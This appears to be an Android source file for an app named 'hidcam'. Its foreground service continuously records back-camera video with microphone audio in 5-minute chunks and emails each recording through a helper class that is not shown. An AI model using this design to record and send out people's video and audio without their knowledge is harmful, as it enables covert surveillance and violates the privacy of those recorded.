package com.noname.hidcam;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.CallSuper;
import androidx.annotation.Nullable;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageAnalysis;
import androidx.camera.core.Preview;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import androidx.lifecycle.LifecycleService;

import com.google.common.util.concurrent.ListenableFuture;

import java.io.File;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;
import java.util.Properties;
import java.util.TimeZone;
import java.util.concurrent.ExecutionException;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

public class MyForegroundService extends LifecycleService  {
//implements LifecycleOwner
    ListenableFuture<ProcessCameraProvider> cameraProviderFuture;

    VideoRecorder videoRecorder;

    File fileForSend;

    @Override
    public void onCreate() {
        super.onCreate();
        videoRecorder = new VideoRecorder();

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        super.onStartCommand(intent, flags, startId);
        NotificationChannel channel = new NotificationChannel("my_channel_id", "My Channel Name", NotificationManager.IMPORTANCE_DEFAULT);
        NotificationManager notificationManager = getSystemService(NotificationManager.class);
        notificationManager.createNotificationChannel(channel);
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "my_channel_id")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentTitle("Running")
                .setContentText("Running")
                .setPriority(NotificationCompat.PRIORITY_DEFAULT);
        int notificationId = 1;
        startForeground(notificationId, builder.build());

        Toast toast = Toast.makeText(getApplicationContext(), "Running", Toast.LENGTH_SHORT);
        toast.show();



        initCam();

        return START_STICKY;
    }



    private void initCam(){
        cameraProviderFuture = ProcessCameraProvider.getInstance(getApplicationContext());

        cameraProviderFuture.addListener(() -> {
            try {
                ProcessCameraProvider cameraProvider = cameraProviderFuture.get();

                Preview preview = new Preview.Builder()
                        .build();

                CameraSelector cameraSelector = new CameraSelector.Builder()
                        .requireLensFacing(CameraSelector.LENS_FACING_BACK)
                        .build();

                ImageAnalysis imageAnalysis = new ImageAnalysis.Builder()
                        .build();

                videoRecorder.startMediaRecorder(getApplicationContext());

                preview.setSurfaceProvider(request -> request.provideSurface(videoRecorder.mRecorder.getSurface(), getMainExecutor(), result -> {}));


                cameraProvider.unbindAll();
                cameraProvider.bindToLifecycle(this, cameraSelector, preview, imageAnalysis);

            } catch (ExecutionException | InterruptedException | IOException e) {
                e.printStackTrace();
            }
        }, ContextCompat.getMainExecutor(getApplicationContext()));
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        videoRecorder.stopMediaRecorder();
        Log.e("myLog", "onDestroy ");
        Toast toast = Toast.makeText(getApplicationContext(),"Stopping", Toast.LENGTH_SHORT);
        toast.show();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        super.onBind(intent);
        return null;
    }

    @SuppressWarnings("deprecation")
    @CallSuper
    @Override
    public void onStart(@Nullable Intent intent, int startId) {
        //mDispatcher.onServicePreSuperOnStart();
        super.onStart(intent, startId);
    }


    public class VideoRecorder implements MediaRecorder.OnInfoListener {
        private MediaRecorder mRecorder;
        private final int MAX_RECORDING_TIME = 5 * 60 * 1000; // minutes in milliseconds
        private final int MAX_FILE_SIZE = 34000000; // MB in bytes

        private void startMediaRecorder(Context context) throws IOException {

            mRecorder = new MediaRecorder(context);


            mRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mRecorder.setOrientationHint(90);
            mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mRecorder.setVideoSize(1280, 720);
            mRecorder.setAudioEncodingBitRate(64000);
            mRecorder.setAudioSamplingRate(44100);
            mRecorder.setMaxFileSize(MAX_FILE_SIZE);

            mRecorder.setMaxDuration(MAX_RECORDING_TIME);
            mRecorder.setOnInfoListener(this);

            mRecorder.setOutputFile(createVideoFile("backCam").getAbsolutePath());
            mRecorder.prepare();
            mRecorder.start();

            Log.e("myLog", "mRecorder.start()");

        }

        private void stopMediaRecorder(){
            if (mRecorder!=null) {
                mRecorder.stop();
                mRecorder.release();
                mRecorder = null;
                Log.e("myLog", "mRecorder.stop()");
                new Thread(() -> {
                    SendMail sendMail = new SendMail();
                    try {
                        sendMail.sendEmailWithAttachment(fileForSend);
                        // Email sent successfully
                    } catch (Exception e) {
                        Log.e("myLog", "sendMail.Exception " + e);
                    }
                }).start();



            }
        }

        private File createVideoFile(String position) throws IOException {
            Calendar cal = Calendar.getInstance(TimeZone.getTimeZone("GMT+3:00"));
            Date currentLocalTime = cal.getTime();
            DateFormat dateTime = new SimpleDateFormat("ddMMyyyy_HH-mm-ss", Locale.getDefault());
            dateTime.setTimeZone(TimeZone.getTimeZone("GMT+3:00"));
            String localTime = dateTime.format(currentLocalTime);

            File storageDir = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES).getAbsolutePath());

            fileForSend = File.createTempFile("VIDEO_" + position + "_" + localTime + "__",".MP4", storageDir);
            Log.e("myLog", fileForSend.getName());
            return fileForSend;
        }

        @Override
        public void onInfo(MediaRecorder mediaRecorder, int what, int extra) {
            if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED ||
                    what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_FILESIZE_REACHED) {
                Log.e("myLog", "onInfo(MediaRecorder)");

                stopMediaRecorder();

                initCam();


            }
        }
    }



}
